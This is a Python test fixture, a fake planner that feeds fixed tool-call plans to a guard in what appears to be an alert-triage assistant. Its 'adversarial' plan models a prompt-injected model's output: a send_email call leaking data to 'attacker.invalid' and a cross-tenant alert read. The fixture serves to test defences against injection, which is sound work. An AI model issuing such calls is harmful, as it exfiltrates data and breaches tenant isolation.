"""Deterministic fake planner. It stands in for an unreliable model.

Everything it returns is UNTRUSTED input to guard.Assistant.execute_plan.
It never calls an LLM and has no access to the data store.
"""
import copy

PLANS = {
    "normal": [
        {"tool": "get_alert", "args": {"alert_id": "A-1"}},
        {"tool": "get_asset", "args": {"asset_id": "AS-1"}},
        {"tool": "propose_ticket", "args": {
            "alert_id": "A-1",
            "title": "Review suspicious script",
            "summary": "Investigate the encoded script; current evidence is not a final malware verdict.",
        }},
    ],
    # What a model might emit after obeying the hostile text in alert A-2.
    "adversarial": [
        {"tool": "get_alert", "args": {"alert_id": "B-1"}},
        {"tool": "send_email", "args": {"to": "attacker.invalid", "body": "leak"}},
        {"tool": "get_alert", "args": {"alert_id": "A-1", "tenant_id": "beta"}},
    ],
}


def plan(scenario: str) -> list[dict]:
    return copy.deepcopy(PLANS[scenario])
